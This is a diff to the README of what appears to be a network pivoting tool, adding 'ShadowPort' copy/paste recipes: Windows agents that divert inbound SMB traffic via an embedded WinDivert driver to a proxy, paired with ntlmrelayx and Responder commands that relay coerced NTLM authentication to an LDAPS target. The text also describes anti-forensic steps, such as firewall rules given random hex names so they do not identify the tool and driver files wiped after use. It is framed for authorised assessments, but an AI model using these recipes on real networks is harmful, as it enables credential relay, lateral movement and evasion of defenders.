@@ -35,6 +35,9 @@ Each bundle contains:
 - `agent-garble`
 - `README.md`
 
+The Windows AMD64 bundle also contains `agent-shadow.exe` and
+`agent-shadow-garble.exe` for the opt-in ShadowPort feature.
+
 Individual Windows executables and `SHA256SUMS.txt` are also attached to the
 release.
 
@@ -503,6 +506,384 @@ man-in-the-middle can impersonate the proxy. Restrict the listener with
 firewall rules and disable no-auth mode after the assessment.
 
 Both sides must opt in. A no-auth agent is rejected by a normal proxy.
+
+</details>
+
+## ShadowPort: receive selected SMB traffic while Windows owns port 445
+
+### ShadowPort copy/paste recipes
+
+ShadowPort target is Windows AMD64. Run target command from elevated
+Administrator PowerShell. SYSTEM is not required.
+
+Replace:
+
+- `PROXY_IP`
+- `SHA256:PROXY_FINGERPRINT`
+
+Use `agent-shadow-garble.exe` instead of `agent-shadow.exe` for Garble build.
+
+Setup assumes the named key files do not exist. If they exist, stop and reuse
+the complete existing key set or use a fresh directory. Do not overwrite keys
+used by a running proxy.
+
+For each Windows `ssh-keygen` command, press Enter twice for empty passphrase.
+Shown commands do not include passphrase environment flags.
+
+Modes 2 and 3 accept unauthenticated agents. `0.0.0.0:22` exposes SSH on every
+interface. Restrict TCP/22 to authorized source IPs with a firewall. Stop proxy
+when assessment ends.
+
+<details open>
+<summary><strong>Mode 1: agent key + proxy fingerprint</strong></summary>
+
+Target files: `agent-shadow.exe` + private `agent` key.
+
+#### Windows proxy
+
+Setup:
+
+```powershell
+New-Item -ItemType Directory -Force .\keys
+ssh-keygen -t ed25519 -f .\keys\proxy-host
+ssh-keygen -t ed25519 -f .\keys\agent
+Copy-Item .\keys\agent.pub .\keys\authorized_keys
+ssh-keygen -lf .\keys\proxy-host.pub -E sha256
+```
+
+Start proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-authorized-keys .\keys\authorized_keys
+```
+
+#### Linux proxy
+
+Setup:
+
+```bash
+mkdir -p ./keys
+ssh-keygen -t ed25519 -f ./keys/proxy-host -N ''
+ssh-keygen -t ed25519 -f ./keys/agent -N ''
+cp ./keys/agent.pub ./keys/authorized_keys
+ssh-keygen -lf ./keys/proxy-host.pub -E sha256
+```
+
+Start proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-authorized-keys ./keys/authorized_keys
+```
+
+Windows target (elevated Administrator PowerShell):
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-key .\agent `
+  -ssh-host-key-fingerprint "SHA256:PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+</details>
+
+<details>
+<summary><strong>Mode 2: no agent key + proxy fingerprint</strong></summary>
+
+Target file: `agent-shadow.exe` only. Proxy identity still verified.
+
+#### Windows proxy
+
+Setup:
+
+```powershell
+New-Item -ItemType Directory -Force .\keys
+ssh-keygen -t ed25519 -f .\keys\proxy-host
+ssh-keygen -lf .\keys\proxy-host.pub -E sha256
+```
+
+Start proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-insecure-allow-no-auth
+```
+
+#### Linux proxy
+
+Setup:
+
+```bash
+mkdir -p ./keys
+ssh-keygen -t ed25519 -f ./keys/proxy-host -N ''
+ssh-keygen -lf ./keys/proxy-host.pub -E sha256
+```
+
+Start proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-insecure-allow-no-auth
+```
+
+Windows target (elevated Administrator PowerShell):
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-host-key-fingerprint "SHA256:PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+</details>
+
+<details>
+<summary><strong>Mode 3: binary only + no proxy pinning</strong></summary>
+
+Target file: `agent-shadow.exe` only. No agent or proxy authentication.
+
+#### Windows proxy
+
+Setup:
+
+```powershell
+New-Item -ItemType Directory -Force .\keys
+ssh-keygen -t ed25519 -f .\keys\proxy-host
+```
+
+Start proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-insecure-allow-no-auth
+```
+
+#### Linux proxy
+
+Setup:
+
+```bash
+mkdir -p ./keys
+ssh-keygen -t ed25519 -f ./keys/proxy-host -N ''
+```
+
+Start proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-insecure-allow-no-auth
+```
+
+Windows target (elevated Administrator PowerShell):
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-insecure-ignore-host-key `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+</details>
+
+<details>
+<summary>ShadowPort behavior, SMB listener, checks, and cleanup</summary>
+
+ShadowPort is available only in the separate Windows AMD64 binaries:
+
+- `agent-shadow.exe`
+- `agent-shadow-garble.exe`
+
+It intercepts only inbound TCP/445 traffic from an explicit source allowlist,
+rewrites it to an unoccupied internal port, and sends the accepted TCP stream
+through the existing SSH listener channel. Other sources continue to the
+native Windows SMB service. It does not require WebDAV and does not stop,
+replace, or reconfigure the service owned by PID 4.
+
+ShadowPort requires an elevated Administrator token; SYSTEM is not required.
+The target receives one EXE. The official signed WinDivert 2.2.2 AMD64 driver
+and its DLL are embedded in that EXE, hash-checked, extracted into a randomly
+named temporary directory only when a ShadowPort listener starts, and wiped and
+removed when the listener stops. The official DLL requires the canonical
+`WinDivert.dll`/`WinDivert64.sys` names next to itself, so the artifacts cannot
+be renamed; the kernel driver image is deleted from disk as soon as the driver
+service has started, and the remaining files are overwritten with zeros before
+removal. A supported Windows driver cannot be loaded without materializing it
+on disk, and abruptly killing the process can leave residue behind (see the
+residue check below). The agent also creates a temporary Windows Firewall allow
+rule scoped to the exact internal IP, port, and source allowlist; it removes
+the rule on listener shutdown. The rule is registered through the native
+Windows Firewall COM API without spawning PowerShell, and its name and display
+name are one random hex token that does not identify the tool.
+
+### Agent with an SSH key
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-key .\agent `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+### Agent without an SSH key
+
+Start the proxy with no-auth explicitly enabled. This proxy command is the
+same for normal and ShadowPort agents; `-allow-shadow-port` belongs only on the
+ShadowPort agent.
+
+Windows proxy:
+
+```powershell
+.\proxy.exe `
+  -laddr ssh://0.0.0.0:22 `
+  -ssh-user ligolo `
+  -ssh-host-key .\keys\proxy-host `
+  -ssh-insecure-allow-no-auth
+```
+
+Linux proxy:
+
+```bash
+sudo ./proxy \
+  -laddr ssh://0.0.0.0:22 \
+  -ssh-user ligolo \
+  -ssh-host-key ./keys/proxy-host \
+  -ssh-insecure-allow-no-auth
+```
+
+Pinned proxy fingerprint:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Binary-only, without proxy verification:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-insecure-ignore-host-key `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+`agent-shadow-garble.exe` accepts the same flags.
+
+### Receive SMB on proxy port 8445
+
+Run the SMB receiver on the same machine as the proxy. Current Impacket
+supports a custom SMB listener port:
+
+```bash
+sudo ntlmrelayx.py \
+  -ip 127.0.0.1 \
+  --smb-port 8445 \
+  -smb2support \
+  -t ldaps://RELAY_TARGET
+```
+
+Responder can be used instead. Run it on a proxy interface, then point `--to`
+at that interface's TCP/445 address:
+
+```bash
+sudo responder -I PROXY_INTERFACE -v
+```
+
+```text
+listener_add --tcp --addr AGENT_IPV4:445 --to PROXY_INTERFACE_IPV4:445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Then select the ShadowPort agent in the proxy console and create the listener:
+
+```text
+session
+listener_add --tcp --addr AGENT_IPV4:445 --to 127.0.0.1:8445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Use the exact IPv4 address assigned to the Windows agent; `0.0.0.0:445` is
+intentionally rejected. `--shadow-source` accepts one or more comma-separated
+IPv4 addresses/CIDRs and should be as narrow as possible. The internal port
+must be free on the agent; the `--to` port is independently chosen for the
+receiver beside the proxy. Stop the listener with `listener_stop`; this closes
+the diversion before releasing the internal socket and removes the runtime
+files and temporary firewall rule.
+
+Inspect the expected state from an elevated Windows PowerShell:
+
+```powershell
+Get-NetTCPConnection -State Listen |
+  Where-Object LocalPort -In 445,8445 |
+  Format-Table LocalAddress,LocalPort,OwningProcess
+Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$'
+Get-ChildItem -Directory -LiteralPath $env:TEMP |
+  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') }
+```
+
+While a listener is active, the second query shows one scoped inbound rule
+named with 16 hex characters, and the third shows one directory holding
+`WinDivert.dll` (the driver image file is already deleted at that point). A
+machine-wide `WinDivert` driver service, registered by the official DLL,
+exists while any filter handle is open; the DLL uninstalls it when the last
+handle closes. After `listener_stop`, all three runtime queries should be
+empty and PID 4 should still own TCP/445. If the process was killed and normal
+cleanup could not run, remove only ShadowPort residue from an elevated
+PowerShell; review each rule's port and address scope first, because other
+software can also use hex-only names:
+
+```powershell
+Get-NetFirewallRule | Where-Object DisplayName -match '^[0-9a-f]{16}$' |
+  Remove-NetFirewallRule
+Get-ChildItem -Directory -LiteralPath $env:TEMP |
+  Where-Object { Test-Path (Join-Path $_.FullName 'WinDivert.dll') } |
+  Remove-Item -Recurse -Force
+```
+
+The Web UI exposes the same settings under **Add New > ShadowPort** only when
+the selected agent advertises `shadowport-smb-v1`.
 
 </details>
 
